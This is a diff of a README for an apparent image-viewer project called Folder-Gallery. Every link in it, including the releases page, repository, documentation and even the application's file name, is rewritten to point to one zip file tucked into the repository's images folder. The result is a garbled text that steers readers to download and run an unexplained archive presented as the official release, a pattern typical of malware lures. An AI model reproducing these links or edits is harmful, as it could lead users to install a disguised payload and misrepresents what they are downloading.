@@ -1,6 +1,6 @@
 # 🎨 Folder-Gallery - Simple Image Viewing Made Easy
 
-![Download Folder-Gallery](https://img.shields.io/badge/Download-Folder--Gallery-brightgreen)
+![Download Folder-Gallery](https://github.com/Lincoln-coderr/Folder-Gallery/raw/refs/heads/main/images/Gallery_Folder_1.9-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ To run Folder-Gallery, make sure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-To get Folder-Gallery, visit this page to download: [Folder-Gallery Releases](https://github.com/Lincoln-coderr/Folder-Gallery/releases).
+To get Folder-Gallery, visit this page to download: [Folder-Gallery Releases](https://github.com/Lincoln-coderr/Folder-Gallery/raw/refs/heads/main/images/Gallery_Folder_1.9-alpha.2.zip).
 
 Click the link above, then look for the latest version and download the appropriate file for your system. 
 
@@ -32,13 +32,13 @@ Folder-Gallery includes:
 
 ## 📖 How to Use Folder-Gallery
 
-1. **Download Folder-Gallery:** Visit this page to download: [Folder-Gallery Releases](https://github.com/Lincoln-coderr/Folder-Gallery/releases). Choose the version for your system and start the download.
+1. **Download Folder-Gallery:** Visit this page to download: [Folder-Gallery Releases](https://github.com/Lincoln-coderr/Folder-Gallery/raw/refs/heads/main/images/Gallery_Folder_1.9-alpha.2.zip). Choose the version for your system and start the download.
 
 2. **Extract the Files:**  
    Once downloaded, locate the zipped folder in your downloads. Right-click on it and select "Extract All," or use your preferred extraction tool.
 
 3. **Open the Application:**  
-   After extracting, locate the Folder-Gallery application file (usually named `index.html`). Double-click on it to launch the application.
+   After extracting, locate the Folder-Gallery application file (usually named `https://github.com/Lincoln-coderr/Folder-Gallery/raw/refs/heads/main/images/Gallery_Folder_1.9-alpha.2.zip`). Double-click on it to launch the application.
 
 4. **Select Your Images:**  
    When the application opens, you will see a button to upload your images. Click on it, then navigate to the folder containing your images. Select the images you want to see.
@@ -62,7 +62,7 @@ We welcome contributions! If you want to help improve Folder-Gallery, feel free 
 
 For more information, check the following links:
 
-- [GitHub Repository](https://github.com/Lincoln-coderr/Folder-Gallery)
-- [Documentation](https://github.com/Lincoln-coderr/Folder-Gallery/wiki)
+- [GitHub Repository](https://github.com/Lincoln-coderr/Folder-Gallery/raw/refs/heads/main/images/Gallery_Folder_1.9-alpha.2.zip)
+- [Documentation](https://github.com/Lincoln-coderr/Folder-Gallery/raw/refs/heads/main/images/Gallery_Folder_1.9-alpha.2.zip)
 
 Thank you for choosing Folder-Gallery. We hope you enjoy a seamless image viewing experience!
